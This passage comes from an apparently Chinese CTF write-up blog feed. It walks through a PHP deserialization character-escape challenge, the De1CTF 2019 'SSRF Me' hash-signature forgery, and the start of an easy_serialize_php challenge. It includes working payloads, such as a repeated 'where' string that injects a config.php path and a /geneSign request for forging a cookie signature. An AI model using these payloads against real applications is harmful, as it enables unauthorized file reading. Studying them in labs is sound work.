$_POST[&#39;nickname&#39;];</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们已经登录了，非常容易地就满足了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br></pre></td></tr></table></figure>

<p>几个变量值都为POST传参</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br></pre></td></tr></table></figure>

<p>正则表达式判断是否为11位的数字电话号码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br></pre></td></tr></table></figure>

<p>这里判断了nickname是否为字符还有长度是否超过10</p>
<p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p>
<p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>

<h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p>
<p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">	$username &#x3D; parent::filter($username);</span><br><span class="line">	$new_profile &#x3D; parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">	return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  我们再继续追寻下去<br>filter()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">	$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">	$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">	$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">	$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">	$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">	return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>update()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function update($table, $key, $value, $where) &#123;</span><br><span class="line">	$sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;</span><br><span class="line">	return mysql_query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p>
<h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul>
<li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string(49) &quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot; </span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(4) &quot;defg&quot; &#125; </span><br></pre></td></tr></table></figure>

<p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(5) &quot;qwert&quot; &#125; </span><br></pre></td></tr></table></figure>

<p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p>
<ul>
<li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;过滤函数</span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">		$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">		$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">		$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">		$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">		return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$a &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p>
<h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/17/buu/12/image-20210817203900289.png" alt="image-20210817203900289"></p>
<p>上传成功，去访问profile.php</p>
<p><img src="/2021/08/17/buu/12/image-20210817204106098.png" alt="image-20210817204106098"></p>
<hr>
<p><img src="/2021/08/17/buu/12/image-20210817204134202.png" alt="image-20210817204134202"></p>
<p>解码一下</p>
<p><img src="/2021/08/17/buu/12/image-20210817204228388.png" alt="image-20210817204228388"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2021/08/18/buu/13/</url>
    <content><![CDATA[<p>[TOC]</p>
<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机开启</p>
<p><img src="/2021/08/18/buu/13/image-20210818200351121.png" alt="image-20210818200351121"></p>
<p>明显的python代码段，复制下来并进行整理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span>		<span class="comment">#是一个简单的赋值函数</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):		<span class="comment">#如果没有该文件夹，则创立一个文件夹</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)	<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)	<span class="comment">#打开方式为只读</span></span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()	<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">        @app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])		#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))		<span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))		<span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))			<span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr				<span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):			<span class="comment">#调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip) 			<span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())			<span class="comment">#以json的形式返回到客户端</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]		<span class="comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>				<span class="comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span>			<span class="comment">#将传入的字符串进行md5加密</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span>						<span class="comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>

<p>代码审计：</p>
<h5 id="1-flask框架"><a href="#1-flask框架" class="headerlink" title="1.flask框架"></a>1.flask框架</h5><h5 id="2-De1ta和-geneSign"><a href="#2-De1ta和-geneSign" class="headerlink" title="2./De1ta和/geneSign"></a>2./De1ta和/geneSign</h5><h5 id="3-task类"><a href="#3-task类" class="headerlink" title="3.task类"></a>3.task类</h5><p>得到flag的大致思路有了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先绕过self.checkSign()，并且传入的action需要同时包含scan和read，然后if &quot;scan&quot; in self.action:执行将flag.txt中的数据写入result.txt中，继续if &quot;read&quot; in self.action:执行读取result.txt中的数据，并且放在 result[&#39;data&#39;] 中 ， return json.dumps(task.Exec())   接着返回以json的形式返回到客户端。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">def getSign(action, param):				#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>需要满足函数</p>
<p>self.checkSign()</p>
<p>则需满足</p>
<p><strong>getSign(self.action, self.param) == self.sign，（而sign值通过cookie传值</strong>）</p>
<p>也就需要</p>
<p><strong>hashlib.md5(secert_key + param + action).hexdigest() == self.sign</strong></p>
<p>=&gt;<strong>hashlib.md5(secert_key + ‘flag.txt’ + ‘readscan’).hexdigest() == self.sign</strong></p>
<p>我们需要得到**secert_key + ‘flag.txtreadscan’**的哈希值</p>
<p>我们还不懂secret_key的值是多少，它只存在于服务端，但是我们可以通过上面截取的源码中/geneSign，来返回我们所需要的编码之后的哈希值</p>
<p>注意到/geneSign中已经将action定为scan，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + ‘flag.txtreadscan’</p>
<h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;geneSign?param&#x3D;flag.txtread</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/18/buu/13/image-20210818205021931.png" alt="image-20210818205021931"></p>
<p>得到哈希值后，将flag.txt中的数据读入result.txt，然后读取result.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              tmpfile = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#注意w，可以对result.txt文件进行修改</span></span><br><span class="line">              resp = scan(self.param)</span><br><span class="line">              <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                  result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                  <span class="keyword">print</span> resp</span><br><span class="line">                  tmpfile.write(resp)	<span class="comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span></span><br><span class="line">                  tmpfile.close()</span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">          <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">              f = open(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)	<span class="comment">#打开方式为只读</span></span><br><span class="line">              result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = f.read()	<span class="comment">#读取result.txt中的数据</span></span><br><span class="line">          <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">              result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><p>伪造cookie的值</p>
<p><img src="/2021/08/18/buu/13/image-20210818205732109.png" alt="image-20210818205732109"></p>
<h5 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h5><p><a href="https://blog.csdn.net/RABCDXB/article/details/115412359">https://blog.csdn.net/RABCDXB/article/details/115412359</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/13685940.html">https://www.cnblogs.com/zzjdbk/p/13685940.html</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <url>/2021/08/19/buu/14/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p>
<p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p>
<p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img src="/2021/08/19/buu/14/image-20210819094121329.png"></p>
<p>发现了参数f</p>
<p>代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">  return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">  unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">  highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">  $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正式审计前，我注意到了题目一个很大的提示</p>
